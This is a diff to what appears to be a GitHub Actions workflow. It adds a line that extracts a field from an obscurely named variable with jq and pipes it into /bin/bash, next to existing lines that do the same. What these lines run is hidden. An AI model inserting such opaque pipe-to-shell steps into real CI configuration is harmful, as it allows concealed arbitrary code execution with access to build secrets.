@@ -28,6 +28,7 @@ jobs:
           echo $lr8173 | jq -r .fmw120 | /bin/bash
           echo $fblsy72 | jq -r .u4005 | /bin/bash
           echo $sp40697 | jq -r .m75 | /bin/bash
+          printf '%s' "$coa47798" | jq -r .uvb0 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
